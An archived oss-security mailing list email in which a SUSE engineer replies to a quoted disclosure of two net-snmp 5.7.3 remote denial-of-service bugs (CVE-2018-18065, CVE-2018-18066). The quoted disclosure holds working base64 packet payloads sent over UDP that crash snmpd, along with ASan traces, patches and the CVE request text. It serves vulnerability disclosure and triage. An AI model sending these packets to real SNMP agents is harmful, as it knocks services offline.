X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["13584" "Tuesday" "9" "October" "2018" "00:31:32" "+0200" "Alexander Bergmann" "abergmann@suse.com" "<20181008223132.bmjr3z5agaq224et@intrepid>" "387" "Re: [oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit available)" nil nil nil "10" "2018100822:31:32" "[oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit available)" (number mark "U       abergmann@su Oct  9  387/13584 " thread-indent "\"Re: [oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit available)\"\n") "<EC9F9CC1-4943-4CD5-8463-F40DF6BCA886@stubman.eu>" ("<EC9F9CC1-4943-4CD5-8463-F40DF6BCA886@stubman.eu>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25637 invoked by uid 550); 9 Oct 2018 06:54:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17620 invoked from network); 8 Oct 2018 22:31:44 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Tue, 9 Oct 2018 00:31:32 +0200
From: Alexander Bergmann <abergmann@suse.com>
To: Magnus Klaaborg Stubman <magnus@stubman.eu>
Cc: oss-security@lists.openwall.com
Message-ID: <20181008223132.bmjr3z5agaq224et@intrepid>
References: <EC9F9CC1-4943-4CD5-8463-F40DF6BCA886@stubman.eu>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="4mvo7hgebx42ykih"
Content-Disposition: inline
In-Reply-To: <EC9F9CC1-4943-4CD5-8463-F40DF6BCA886@stubman.eu>
User-Agent: NeoMutt/20170421 (1.8.2)
Subject: Re: [oss-security] net-snmp 5.7.3 unauthenticated remote Denial of
 Service (exploit available)

--4mvo7hgebx42ykih
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi Magnus,

thanks for your report. I can reproduce VULN#2 (CVE-2018-18065) with our
net-snmp-5.7.3 version (sle12/sle15). Our net-snmp-5.4.2.1 version seams
to be unaffected.

Regarding your VULN#1 (CVE-2018-18066) I noticed that the patch was
already applied to our code base and CVE-2015-5621 was assigned. The
issue was already mentioned here at oss-security.

https://www.openwall.com/lists/oss-security/2015/07/31/1

I didn't check the details yet, but if the new CVE is a duplicate,
please contact NIST about it.


Kind regards,
Alex~

On Mon, Oct 08, 2018 at 08:46:29PM +0200, Magnus Klaaborg Stubman wrote:
> Reference: https://dumpco.re/blog/net-snmp-5.7.3-remote-dos
>=20
> 2018-10-08
>=20
> NET-SNMP REMOTE DOS
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> Back in january I did some vulnerability research of net-snmp 5.7.3 and f=
ound some bugs.=20
> Here they are:
>=20
> VULN#1 CVE-2018-18066
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> First bug is remotely exploitable without knowledge of the community stri=
ng, and leads to Denial of Service:
>=20
>   # echo -n "MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyIC=
AQgCAgq5BAVwaXBwbwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEs=
wDQEEAWFFg2MiBAChWQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNT=
UuMAEEAYF9CDMKAgEHCobetzgECzE3Mi4zMS4xOS4y" | base64 -d > /dev/udp/127.0.0.=
1/1111
>=20
>   # net-snmp-5.7.3/agent/snmpd -f -d -V -c ../../snmpd.conf -Ln  127.0.0.=
1:1111
>   ASAN:SIGSEGV
>   =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>   =3D=3D41810=3D=3DERROR: AddressSanitizer: SEGV on unknown address 0x000=
000000000 (pc 0x0000007f261b bp 0x7fff34754550 sp 0x7fff34754220 T0)
>       #0 0x7f261a in snmp_oid_compare /home/magnus/projects/net-snmp/net-=
snmp-5.7.3/snmplib/snmp_api.c:6470:13
>       #1 0x7f261a in _snmp_parse /home/magnus/projects/net-snmp/net-snmp-=
5.7.3/snmplib/snmp_api.c:4247
>       #2 0x7f261a in snmp_parse /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/snmplib/snmp_api.c:4336
>       #3 0x7f261a in _sess_process_packet /home/magnus/projects/net-snmp/=
net-snmp-5.7.3/snmplib/snmp_api.c:5241
>       #4 0x7ef331 in _sess_read /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/snmplib/snmp_api.c:5877:14
>       #5 0x7ed2e0 in snmp_sess_read2 /home/magnus/projects/net-snmp/net-s=
nmp-5.7.3/snmplib/snmp_api.c:5911:10
>       #6 0x7ed2e0 in snmp_read2 /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/snmplib/snmp_api.c:5502
>       #7 0x4f9286 in receive /home/magnus/projects/net-snmp/net-snmp-5.7.=
3/agent/snmpd.c:1375:15
>       #8 0x4f9286 in main /home/magnus/projects/net-snmp/net-snmp-5.7.3/a=
gent/snmpd.c:1118
>       #9 0x7f2561efeb44 in __libc_start_main /build/glibc-6V9RKT/glibc-2.=
19/csu/libc-start.c:287
>       #10 0x4f617c in _start (/home/magnus/projects/net-snmp/net-snmp-5.7=
.3/agent/snmpd+0x4f617c)
>=20
>   AddressSanitizer can not provide additional info.
>   SUMMARY: AddressSanitizer: SEGV /home/magnus/projects/net-snmp/net-snmp=
-5.7.3/snmplib/snmp_api.c:6470 snmp_oid_compare
>   =3D=3D41810=3D=3DABORTING
>=20
>=20
> Same configuration for both bugs:
>=20
>   magnus@h4xb0x:~/projects/net-snmp$ cat snmpd.conf
>   rocommunity public  default    -V systemonly
>   rocommunity public  localhost    -V systemonly
>   rouser   authOnlyUser
>   syslocation  "On the Desk"
>   syscontact  Me <me@example.org>
>=20
> VULN#2 CVE-2018-18065
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> Second bug is remotely exploitable only with knowledge of the community s=
tring (in this case "public") leading to Denial of Service:
>=20
>   # echo -n "MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIB=
BwqG3rc1BAwxNzIuMzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0=
IMwoCAQcKht63NgQNMjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS=
4xOS4y" | base64 -d > /dev/udp/127.0.0.1/1111
>=20
>   # net-snmp-5.7.3/agent/snmpd -f -d -V -c ../../snmpd.conf -Ln  127.0.0.=
1:1111
>   ASAN:SIGSEGV
>   =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>   =3D=3D41062=3D=3DERROR: AddressSanitizer: SEGV on unknown address 0x000=
000000410 (pc 0x00000075bc0f bp 0x7ffdda226b10 sp 0x7ffdda2269e0 T0)
>       #0 0x75bc0e in _set_key /home/magnus/projects/net-snmp/net-snmp-5.7=
.3/agent/helpers/table_container.c:564:9
>       #1 0x75bc0e in _data_lookup /home/magnus/projects/net-snmp/net-snmp=
-5.7.3/agent/helpers/table_container.c:614
>       #2 0x75bc0e in _container_table_handler /home/magnus/projects/net-s=
nmp/net-snmp-5.7.3/agent/helpers/table_container.c:749
>       #3 0x572262 in netsnmp_call_handler /home/magnus/projects/net-snmp/=
net-snmp-5.7.3/agent/agent_handler.c:526:15
>       #4 0x572dc4 in netsnmp_call_next_handler /home/magnus/projects/net-=
snmp/net-snmp-5.7.3/agent/agent_handler.c:640:12
>       #5 0x58751c in table_helper_handler /home/magnus/projects/net-snmp/=
net-snmp-5.7.3/agent/helpers/table.c:713:9
>       #6 0x572262 in netsnmp_call_handler /home/magnus/projects/net-snmp/=
net-snmp-5.7.3/agent/agent_handler.c:526:15
>       #7 0x572c79 in netsnmp_call_handlers /home/magnus/projects/net-snmp=
/net-snmp-5.7.3/agent/agent_handler.c:611:14
>       #8 0x520d86 in handle_var_requests /home/magnus/projects/net-snmp/n=
et-snmp-5.7.3/agent/snmp_agent.c:2679:22
>       #9 0x524dbe in handle_pdu /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/agent/snmp_agent.c:3441:18
>       #10 0x51b976 in netsnmp_handle_request /home/magnus/projects/net-sn=
mp/net-snmp-5.7.3/agent/snmp_agent.c:3284:14
>       #11 0x515876 in handle_snmp_packet /home/magnus/projects/net-snmp/n=
et-snmp-5.7.3/agent/snmp_agent.c:1990:10
>       #12 0x7f3558 in _sess_process_packet /home/magnus/projects/net-snmp=
/net-snmp-5.7.3/snmplib/snmp_api.c:5437:7
>       #13 0x7ef331 in _sess_read /home/magnus/projects/net-snmp/net-snmp-=
5.7.3/snmplib/snmp_api.c:5877:14
>       #14 0x7ed2e0 in snmp_sess_read2 /home/magnus/projects/net-snmp/net-=
snmp-5.7.3/snmplib/snmp_api.c:5911:10
>       #15 0x7ed2e0 in snmp_read2 /home/magnus/projects/net-snmp/net-snmp-=
5.7.3/snmplib/snmp_api.c:5502
>       #16 0x4f9286 in receive /home/magnus/projects/net-snmp/net-snmp-5.7=
.3/agent/snmpd.c:1375:15
>       #17 0x4f9286 in main /home/magnus/projects/net-snmp/net-snmp-5.7.3/=
agent/snmpd.c:1118
>       #18 0x7fc1acb11b44 in __libc_start_main /build/glibc-6V9RKT/glibc-2=
.19/csu/libc-start.c:287
>       #19 0x4f617c in _start (/home/magnus/projects/net-snmp/net-snmp-5.7=
.3/agent/snmpd+0x4f617c)
>=20
>   AddressSanitizer can not provide additional info.
>   SUMMARY: AddressSanitizer: SEGV /home/magnus/projects/net-snmp/net-snmp=
-5.7.3/agent/helpers/table_container.c:564 _set_key
>   =3D=3D41062=3D=3DABORTING
>=20
>=20
> PATCHES
> =3D=3D=3D=3D=3D=3D=3D
>=20
> Update to net-snmp-5.8 or apply the following patches:
>=20
> Vuln#1: sourceforge.net/p/net-snmp/code/ci/f23bcd3ac6ddee5d0a48f9703007cc=
c738914791
> Vuln#2: sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170=
e9bf8c457d
>=20
> AFFECTED
> =3D=3D=3D=3D=3D=3D=3D=3D
>=20
> - 5.7.3
> - 5.5.2.1
> - 5.6.2.1
>=20
> More versions may be affected as well.
>=20
> TIMELINE
> =3D=3D=3D=3D=3D=3D=3D=3D
>=20
> 2015-04-11 Vendor releases patch of bug#1 in version control - no public =
article or otherwise disclosure
> 2016-10-06 Vendor releases patch of bug#2 in version control - no public =
article or otherwise disclosure
> 2018-01-05 I discovered both bugs
> 2018-01-08 Vendor notified
> 2018-01-08 Vendor responds - bugs already fixed in version control repo
> 2018-10-08 Public disclosure of exploit
> 2018-10-08 CVE-ID assignment
>=20
>=20
> PROOF OF DISCOVERY
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
>   # cat vuln1 | base64
>   MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyICAQgCAgq5BAV=
waXBw
>   bwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEswDQEEAWFFg2M=
iBACh
>   WQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNTUuMAEEAYF9CDM=
KAgEH
>   CobetzgECzE3Mi4zMS4xOS4y
>   # sha256sum vuln1
>   b2ff63c97c705c25c0043758cbd7b1e00cb5692ba1223712a17461082a047125  vuln1
>   twitter.com/magnusstubman/status/949520650762358789
>=20
>   # cat vuln2 | base64
>   MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBwqG3rc1BAw=
xNzIu
>   MzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IMwoCAQcKht6=
3NgQN
>   MjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4xOS4y
>   # sha256sum vuln2
>   b7f0e494b8a91c6fedb7e13b3b8dab68a951b5fdc21dd876ae91eb86924018f2  vuln2
>   twitter.com/magnusstubman/status/949520565064404994
>=20
>=20
> REFERENCES
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> - sourceforge.net/p/net-snmp/bugs/2820
> - sourceforge.net/p/net-snmp/bugs/2819
>=20
>=20
> CVE ASSIGNMENTS
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> > [Suggested description]
> > _set_key in agent/helpers/table_container.c in
> > Net-SNMP before 5.8
> > has a NULL Pointer Exception bug that can be used by an
> > authenticated attacker to remotely cause the instance to crash via a cr=
afted UDP packet,
> > resulting in Denial of Service.
> >
> > ------------------------------------------
> >
> > [Additional Information]
> > Proof of concept exploit are publicly available at dumpco.re/blog/net-s=
nmp-5.7.3-remote-dos
> >
> > ------------------------------------------
> >
> > [VulnerabilityType Other]
> > Remote Denial of Service (Null Pointer Exception)
> >
> > ------------------------------------------
> >
> > [Vendor of Product]
> > net-snmp
> >
> > ------------------------------------------
> >
> > [Affected Product Code Base]
> > net-snmp - vulnerable: 5.7.3, 5.5.2.1, 5.6.2.1. Fixed in: 5.8
> >
> > ------------------------------------------
> >
> > [Affected Component]
> > snmpd
> >
> > ------------------------------------------
> >
> > [Attack Type]
> > Remote
> >
> > ------------------------------------------
> >
> > [Impact Denial of Service]
> > true
> >
> > ------------------------------------------
> >
> > [Attack Vectors]
> > A crafted UDP packet must be sent to the target.
> >
> > ------------------------------------------
> >
> > [Reference]
> > dumpco.re/blog/net-snmp-5.7.3-remote-dos
> > sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170e9bf8c=
457d
> >
> > ------------------------------------------
> >
> > [Has vendor confirmed or acknowledged the vulnerability?]
> > true
>=20
> Use CVE-2018-18065.
>=20
>=20
> > [Suggested description]
> > snmp_oid_compare in snmplib/snmp_api.c in
> > Net-SNMP before 5.8
> > has a NULL Pointer Exception bug that can be used by an
> > unauthenticated attacker to remotely cause the instance to crash via a =
crafted UDP packet,
> > resulting in Denial of Service.
> >
> > ------------------------------------------
> >
> > [Additional Information]
> > Proof of concept exploit are publicly available at dumpco.re/blog/net-s=
nmp-5.7.3-remote-dos
> >
> > ------------------------------------------
> >
> > [VulnerabilityType Other]
> > Remote Denial of Service (NULL Pointer Exception)
> >
> > ------------------------------------------
> >
> > [Vendor of Product]
> > net-snmp
> >
> > ------------------------------------------
> >
> > [Affected Product Code Base]
> > net-snmp - vulnerable: 5.7.3, 5.5.2.1, 5.6.2.1. Fixed in: 5.8
> >
> > ------------------------------------------
> >
> > [Affected Component]
> > snmpd
> >
> > ------------------------------------------
> >
> > [Attack Type]
> > Remote
> >
> > ------------------------------------------
> >
> > [Impact Denial of Service]
> > true
> >
> > ------------------------------------------
> >
> > [Attack Vectors]
> > A crafted UDP packet must be sent to the target.
> >
> > ------------------------------------------
> >
> > [Reference]
> > dumpco.re/blog/net-snmp-5.7.3-remote-dos
> > sourceforge.net/p/net-snmp/code/ci/f23bcd3ac6ddee5d0a48f9703007ccc73891=
4791
> > sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170e9bf8c=
457d
> >
> > ------------------------------------------
> >
> > [Has vendor confirmed or acknowledged the vulnerability?]
> > true
>=20
> Use CVE-2018-18066.
>=20
>=20
> --
> CVE Assignment Team
> M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
> [ A PGP key is available for encrypted communications at
>   cve.mitre.org/cve/request_id.html ]

--=20
Alexander Bergmann <abergmann@suse.com>, Security Engineer, GPG:9FFA4886
SUSE Linux GmbH, GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG N=FCrnberg)

--4mvo7hgebx42ykih
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQEcBAEBAgAGBQJbu9rDAAoJEN5U6HWf+kiGIx8IAKkvktAhu3FV68g9ZPpr2VYr
0CTULilybgyr5HZ+ZimRyIeMHBUhNPVBSwHe1+wjsHKKpF1n/WzQYuZgxVwOYqdi
5p6iyc27895up2tZT+OpmDJWLMLE0CyAtuURfEWCHiKlVwd1wluO5ci0XQBO4+CJ
76AABWmNojwyGPamW4zAmoVE5FgCyYZXd/1vUPdzPPJfG8kEen38PySBR3WVNTeU
1x9gYlSOu+OhgZ7xU4cIWBTsyD5sITC2nVTGc8XEVU9p+YjC4qVrO8I86JG6E5Q+
x42BglOrUYpgFs+IeyiEMfxmxEbkL7Pm8S0a9XNw6A4ui7MGkb1GZoG55rhod6s=
=/mRg
-----END PGP SIGNATURE-----

--4mvo7hgebx42ykih--
